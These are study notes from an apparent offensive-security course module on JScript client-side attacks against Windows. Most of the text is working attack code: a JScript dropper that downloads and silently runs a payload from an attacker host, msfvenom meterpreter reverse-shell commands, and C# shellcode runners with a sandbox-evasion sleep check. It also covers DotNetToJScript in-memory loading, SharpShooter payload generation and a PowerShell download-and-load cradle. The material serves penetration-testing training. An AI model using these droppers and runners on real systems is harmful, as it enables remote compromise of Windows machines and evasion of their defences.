![[Pasted image 20240531231746.png]]

[The End of an Era: Microsoft Phases Out VBScript for JavaScript and PowerShell](https://thehackernews.com/2024/05/the-end-of-era-microsoft-phases-out.html)

Similar to VBA macros, JavaScript is also used in client-side attacks.

This module focuses on using the Jscript file format to execute Javascript on Windows targets through the Windows Script Host (WSH).

The process begins with a simple dropper that opens a `cmd.exe` and gradually improves the attack by reflectively loading a pre-compiled C# assembly to execute the shellcode runner completely in memory.

Note: To fully grasp the concepts taught throughout this module, it is expected that you have some basic programming skills in **C#/.NET**. 

[Basic CSharp 101](https://github.com/col-1002/OSEP-Course/blob/main/Learn%20Csharp/README.md)

# 4.1 Creating a basic dropper in Jscript

Jscript is a dialect of JavaScript developed and owned by Microsoft that is used in Internet Explorer. It can also be executed outside the browser through the [Windows Script Host](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wscript) (WSH),  which can execute scripts in a variety of languages.

## 4.1.1 Execution of Jscript on Windows

In Windows, a file’s format is identified by the file extension. File extensions are often associated with default applications. 

To view these associations, navigate to Settings > Apps > Default apps, scroll to the bottom, and click "Choose default apps by file type".

![[Pasted image 20230914111548.png]]
![[Pasted image 20230914111805.png]]

[ActiveX](https://en.wikipedia.org/wiki/ActiveX) + WSH engine to executing Jscript.

Execution_of_Jscript on_Windows.js

```js
// create a ActiveXObject constructor 
var shell = new ActiveXObject("WScript.Shell") 

// execute an external program
var res = shell.Run("calc.exe");
```

[Microsoft HTML Application](https://en.wikipedia.org/wiki/HTML_Application) form. Basic_Microsoft_HTML_Application_v1.hta

```hta
<html>
<head>
	<title>HTML Smuggling Example v1</title>
	<script language="JScript"> 
	// create a ActiveXObject constructor 
	var shell = new ActiveXObject("WScript.Shell") 

	// execute an external program
	var res = shell.Run("calc.exe");
	</script>
</head> 
<body>
    Nothing to see here..
</body>
</html>
```

## 4.1.2 Jscript Dropper

References:
- [XMLHTTPRequest](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms759148(v=vs.85))
- [status Property (IXMLHTTPRequest)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms767625%28v%3dvs.85%29)
- [responseBody Property (ServerXMLHTTPRequest-IServerXMLHTTPRequest)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms753682%28v%3dvs.85%29)

Complete Jscript code to download and execute a staged payload

Basic_Jscript_dropper.js

```js
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.1.123 LPORT=443 -f exe -o staged_shell.exe
// URL to download the payload executable
var url = "http://10.0.0.123/staged_shell.exe";

try {
    // Use more explicit object names and ensure only necessary objects are created
    var httpRequest = WScript.CreateObject('MSXML2.XMLHTTP');
    httpRequest.Open('GET', url, false);  // Synchronous request
    httpRequest.Send();

    // Check for HTTP OK status before proceeding
    if (httpRequest.Status === 200) {
        var fileStream = WScript.CreateObject('ADODB.Stream');
        fileStream.Open();
        fileStream.Type = 1; // Binary type
        fileStream.Write(httpRequest.ResponseBody); // Write binary data
        fileStream.Position = 0; // Set the stream position to the beginning

        // Enhanced security for file path and handling
        var shell = WScript.CreateObject("WScript.Shell");
        var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");  // Use temp directory
        var filePath = tempFolder + "\\staged_shell.exe";

        fileStream.SaveToFile(filePath, 2); // Save file as overwrite if exists
        fileStream.Close();

        // Execute the payload from a secure location and handle execution separately
        shell.Run(filePath, 0, true); // 0 - window style hidden, true - wait for return
    } else {
        WScript.Echo("Failed to download the payload. Server returned status: " + httpRequest.Status);
    }
} catch (e) {
    // Error handling to catch and log errors if any step fails
    WScript.Echo("An error occurred: " + e.message);
}

```

![[Pasted image 20240601114120.png]]

# 4.2 Jscript and C`#`

Invoke Win32 APIs to run the payload completely from memory.

This can be done by embed a compiled C# assembly in the Jscript file and execute it.

## 4.2.1 Introduction to Visual Studio

[Basic CSharp 101](https://github.com/col-1002/OSEP-Course/blob/main/Learn%20Csharp/README.md)
- C# IDE: Visual Studio
- Project type: Console Application (.NET Framework)
- Can be done by Command Line or GUI.

Create a new Console Application - using CLI.

```powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS E:\HTB_Academy\HTB_CWEE_source_code\Intro to C Sharp\Assessment_console_app> dotnet new console
The template "Console App" was created successfully.

Processing post-creation actions...
Restoring E:\HTB_Academy\HTB_CWEE_source_code\Intro to C Sharp\Assessment_console_app\Assessment_console_app.csproj:
  Determining projects to restore...
  Restored E:\HTB_Academy\HTB_CWEE_source_code\Intro to C Sharp\Assessment_console_app\Assessment_console_app.csproj (i
  n 118 ms).
Restore succeeded.
```

## 4.2.2 DotNetToJscript

Credit: [DotNetToJScript: A tool to create a JScript file which loads a .NET v2 assembly from memory](https://github.com/tyranid/DotNetToJScript) by James Forshaw.

Purpose: launch a command prompt 

### Testclass

Replace `testclass.cs` with following code

```cs
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        // Displaying a MessageBox upon instantiation of the object and launch an external program
        MessageBox.Show("Initialized", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        Process.Start("calc.exe");
    }
}
```

![](https://raw.githubusercontent.com/col-1002/OSEP-Course/main/Attachment/Build_DotNetToJScript.png)

Switch from **Debug** to **Release** mode and compile the entire solution with "Build" > "Build Solution". Then move three file to one folder:
- DotNetToJScript.exe
- NDesk.Options.dll
- ExampleAssembly.dll

Command to build Jscript file

```powershell
.\DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```

![[Pasted image 20240601193932.png]]

### File runner.js

```js
// config the WSH to use version 4.0.30319 of the .NET framework
function setversion() {
	new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {} // debug flag (-d)

// base64 decoding function 
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);

	// leverages various .NET classes through ActiveXObject instantiation
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "BASE64_ENCODED_BINARY_BLOB"; // compiled C# assembly
var entry_class = 'TestClass'; // class executed

// Deserialization of assembly ExampleAssembly.dll in memory
try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}
```

## 4.2.3 Win32 APIs call from C`#`

When calling Win32 APIs from PowerShell, use the straightforward Add-Type method and the more complicated reflection technique. 

When dealing with C#, compiling the assembly before sending it to the victim and executing it in memory, will avoid writing C# source code and compiled assembly files temporarily to disk during execution.

demo how to import and call Win32 APIs from C# without having to use reflection technique.

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics; // To use the DllImport statement and invoke the Win32 APIs
using System.Runtime.InteropServices; // To use the DllImport statement and invoke the Win32 APIs

namespace ConsoleApp1
{ 
 class Program
	{ 
		[DllImport("user32.dll", CharSet = CharSet.Auto)] // Import and link Win32 APIs
		public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
		
		static void Main(string[] args)
		{ 
			MessageBox(IntPtr.Zero, "Win32 APIs call from C#", "This is my caption", 0);
		} 
	} 
}
```

## 4.2.4 C`#` Shellcode Runner

Have the basic framework, the next is reuse the shellcode runner technique from both **VBA** and **PowerShell** and combine VirtualAlloc, CreateThread, and WaitForSingleObject to execute shellcode in memory.

Basic_Shellcode_Runner_C#

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices; 

namespace Basic_Shellcode_Runner
{
    public class Program
    {
        public const uint EXECUTEREADWRITE  = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);

        public static void Main()
        {

            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.123 LPORT=443 -f csharp
            byte[] buf = new byte[511] { SHELLCODE_GO_HERE
            };
            int payloadSize = buf.Length;

			// Allocate executable memory
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);

			// Copy shellcode to allocated memory
            Marshal.Copy(buf, 0, payAddr, payloadSize);

			// Execute shellcode
            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);

			// wait for it to exit
            int waitResult = WaitForSingleObject(payThreadId, -1);
        }
    }
}
```

**Before compiling the project, set the CPU architecture to x64**

![](https://raw.githubusercontent.com/col-1002/OSEP-Course/main/Attachment/Opening%20Configuration%20Manager%20in%20Visual%20Studio.png)

In the Configuration Manager, choose `<NEW ...>` from the **Platform** drop down menu and accept the new platform as x64

![](https://raw.githubusercontent.com/col-1002/OSEP-Course/main/Attachment/Opening%20Configuration%20Manager%20in%20Visual%20Studio_v2.png)

Compile the C# project, execute will give back the reverse shell

![[Pasted image 20240601203400.png]]

## 4.2.5 Jscript Shellcode Runner

Now that having the C# shellcode runner working, the next is modify the ExampleAssembly project in DotNetToJscript to execute the shellcode runner instead of the previous simple POC code. Also generate a Jscript file with the compiled assembly so we can launch the shellcode runner directly from Jscript. 

### Pratice
- Create a simple Jscript shellcode runner

```cs
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    public const uint EXECUTEREADWRITE = 0x40;
    public const uint COMMIT_RESERVE = 0x3000;

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

    [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);
    public TestClass()
    {
        DateTime t1 = DateTime.Now;
        Sleep(10000);
        double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
        if (deltaT < 9.5)
        {
            return;
        }

        // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.123 LPORT=443 -f csharp
        byte[] buf = new byte[510] { SHELLCODE_GO_HERE
            };

        int payloadSize = buf.Length;

        // Allocate executable memory
        IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);

        // Copy shellcode to allocated memory
        Marshal.Copy(buf, 0, payAddr, payloadSize);

        // Execute shellcode
        IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);

        // wait for it to exit
        int waitResult = WaitForSingleObject(payThreadId, -1);
    }
}
```

Command to build Jscript file

```powershell
.\DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o Basic_Jscript_Shellcode_Runner.js
```

![[Pasted image 20240601210047.png]]

- Use `DotNetToJscript` to obtain a shellcode runner in VBScript format. -> No because [The End of an Era: Microsoft Phases Out VBScript for JavaScript and PowerShell](https://thehackernews.com/2024/05/the-end-of-era-microsoft-phases-out.html) 

# 4.3 Automation - SharpShooter

Automation of the process of this module using the tools called [SharpShooter](https://github.com/mdsecactivebreach/SharpShooter) 

SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code. SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS and WSF. 

[Installation](https://www.kali.org/tools/sharpshooter/#sharpshooter) in Kali Linux

```bash
sudo apt-get update
sudo apt install python3-jsmin
sudo apt install sharpshooter
sharpshooter -h
```

Create a raw staged payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.1.123 LPORT=443 -f raw -o staged_shell.txt`

Stageless JavaScript

```bash
sharpshooter --payload js --dotnetver 4 --stageless --rawscfile staged_shell.txt --sandbox 1=contoso,2,3 --output staged_shell_JScript
```

[Demiguise](https://github.com/nccgroup/demiguise) - HTA encryption tool for RedTeams

# 4.4. In-memory PowerShell Revisited

Create a Class Library (.NET Framework)

Copy the content of "C# shellcode runner" and compile it and copy the resulting DLL in to Web Server.

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

# 4.5 Wrapping Up

Client-side attack using Jscript and C#

There are more combinations techniques in the wild. Pentester have used the HTML Application or HTA attack against Internet Explorer for many years. The combination of HTA and HTML smuggling has allowed it to be efficiently used against other browsers and weaponized as the Demiguise tool.

A somewhat newer technique leverages the ability to instantiate other scripting engines in .NET like [IronPython](https://ironpython.net/) which lets a Pentester combine the power of Python and .NET. [Trinity](https://github.com/byt3bl33d3r/SILENTTRINITY) is a framework for implementing this post-exploitation.

.